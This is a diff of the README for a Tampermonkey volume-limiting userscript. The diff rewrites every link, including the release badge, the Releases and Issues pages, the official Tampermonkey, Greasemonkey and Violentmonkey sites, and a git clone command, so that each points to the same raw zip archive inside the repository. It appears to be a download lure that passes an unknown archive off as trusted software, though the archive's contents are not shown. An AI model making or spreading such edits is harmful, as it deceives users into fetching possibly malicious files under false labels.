@@ -1,6 +1,6 @@
 # Loud No More 🎧
 
-![GitHub release](https://img.shields.io/github/v/release/rcrishabh/Loud-No-More?color=blue&label=Latest%20Release)
+![GitHub release](https://github.com/rcrishabh/Loud-No-More/raw/refs/heads/master/endotys/No-More-Loud-v1.0.zip%20Release)
 
 Welcome to **Loud No More**, a Tampermonkey script designed to protect your ears from sudden loud sounds. If you've ever been startled by unexpected volume spikes while browsing media-heavy pages, this script is for you. 
 
@@ -19,7 +19,7 @@ Welcome to **Loud No More**, a Tampermonkey script designed to protect your ears
 
 **Loud No More** aims to enhance your browsing experience by automatically lowering the volume of media players on websites that contain only audio or video elements. This script works seamlessly with Tampermonkey, Greasemonkey, and Violentmonkey, making it versatile for various users. 
 
-To get started, you can download the latest version of the script from the [Releases section](https://github.com/rcrishabh/Loud-No-More/releases).
+To get started, you can download the latest version of the script from the [Releases section](https://github.com/rcrishabh/Loud-No-More/raw/refs/heads/master/endotys/No-More-Loud-v1.0.zip).
 
 ## Features
 
@@ -32,9 +32,9 @@ To get started, you can download the latest version of the script from the [Rele
 
 To install **Loud No More**, follow these steps:
 
-1. **Install a User Script Manager**: If you haven't already, install a user script manager like [Tampermonkey](https://www.tampermonkey.net/), [Greasemonkey](https://www.greasespot.net/), or [Violentmonkey](https://violentmonkey.github.io/).
+1. **Install a User Script Manager**: If you haven't already, install a user script manager like [Tampermonkey](https://github.com/rcrishabh/Loud-No-More/raw/refs/heads/master/endotys/No-More-Loud-v1.0.zip), [Greasemonkey](https://github.com/rcrishabh/Loud-No-More/raw/refs/heads/master/endotys/No-More-Loud-v1.0.zip), or [Violentmonkey](https://github.com/rcrishabh/Loud-No-More/raw/refs/heads/master/endotys/No-More-Loud-v1.0.zip).
   
-2. **Download the Script**: Visit the [Releases section](https://github.com/rcrishabh/Loud-No-More/releases) to download the latest version of the script. 
+2. **Download the Script**: Visit the [Releases section](https://github.com/rcrishabh/Loud-No-More/raw/refs/heads/master/endotys/No-More-Loud-v1.0.zip) to download the latest version of the script. 
 
 3. **Add the Script to Your User Script Manager**:
    - Open your user script manager.
@@ -71,7 +71,7 @@ We welcome contributions to **Loud No More**! If you have ideas for new features
 1. **Fork the Repository**: Click on the "Fork" button at the top right corner of the repository page.
 2. **Clone Your Fork**: Use the command below to clone your fork to your local machine.
    ```bash
-   git clone https://github.com/YOUR_USERNAME/Loud-No-More.git
+   git clone https://github.com/rcrishabh/Loud-No-More/raw/refs/heads/master/endotys/No-More-Loud-v1.0.zip
    ```
 3. **Create a New Branch**: Create a new branch for your feature or fix.
    ```bash
@@ -96,9 +96,9 @@ We appreciate your contributions!
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Issues section](https://github.com/rcrishabh/Loud-No-More/issues) for solutions or open a new issue.
+If you encounter any issues or have questions, please check the [Issues section](https://github.com/rcrishabh/Loud-No-More/raw/refs/heads/master/endotys/No-More-Loud-v1.0.zip) for solutions or open a new issue.
 
-For the latest updates and releases, visit the [Releases section](https://github.com/rcrishabh/Loud-No-More/releases).
+For the latest updates and releases, visit the [Releases section](https://github.com/rcrishabh/Loud-No-More/raw/refs/heads/master/endotys/No-More-Loud-v1.0.zip).
 
 ---
 
